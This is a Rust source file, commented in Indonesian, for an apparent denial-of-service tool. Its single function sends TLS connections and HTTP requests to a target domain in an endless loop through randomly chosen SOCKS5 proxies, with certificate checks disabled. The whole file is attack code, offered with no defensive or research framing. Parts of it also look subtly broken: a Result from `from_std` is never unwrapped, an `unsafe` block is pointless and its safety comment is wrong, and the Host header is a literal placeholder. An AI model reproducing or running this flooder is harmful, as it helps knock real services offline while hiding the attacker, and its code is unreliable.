use tokio::io::AsyncWriteExt;
use native_tls::TlsConnector as NativeTls;
use tokio_native_tls::TlsConnector;
use socks::Socks5Stream;
use tokio::time::{sleep, Duration};
use crate::utils::get_random_proxy;
use tokio::io::{AsyncRead, AsyncWrite};
use tokio::net::TcpStream;
use std::pin::Pin;

pub async fn start_tls_flood(domain: &str, port: u16, proxies: Vec<String>) {
    let connector = TlsConnector::from(
        NativeTls::builder()
            .danger_accept_invalid_certs(true)
            .build()
            .unwrap(),
    );

    loop {
        if let Some(proxy) = get_random_proxy(&proxies) {
            match Socks5Stream::connect(proxy.clone(), (domain, port)) {
                Ok(mut stream) => {
                    // Konversi stream ke tokio::net::TcpStream yang async
                    let socket = stream.get_mut();
                    let stream = unsafe {
                        // SAFETY: Kita mengkonversi std::net::TcpStream ke tokio::net::TcpStream
                        // Ini aman karena kita memiliki kepemilikan penuh atas socket
                        TcpStream::from_std(std::net::TcpStream::from(socket.try_clone().unwrap()))
                    };

                    match connector.connect(domain, &stream).await {
                        Ok(mut tls_stream) => {
                            match tls_stream.write_all(b"GET / HTTP/1.1\r\nHost: host\r\n\r\n").await {
                                Ok(_) => println!("[TLS] Sent via {}", proxy),
                                Err(e) => eprintln!("[TLS] Write error: {}", e),
                            }
                        }
                        Err(e) => eprintln!("[TLS] TLS connection error: {}", e),
                    }
                }
                Err(e) => eprintln!("[TLS] Proxy error: {}", e),
            }
        }
        sleep(Duration::from_millis(10)).await;
    }
}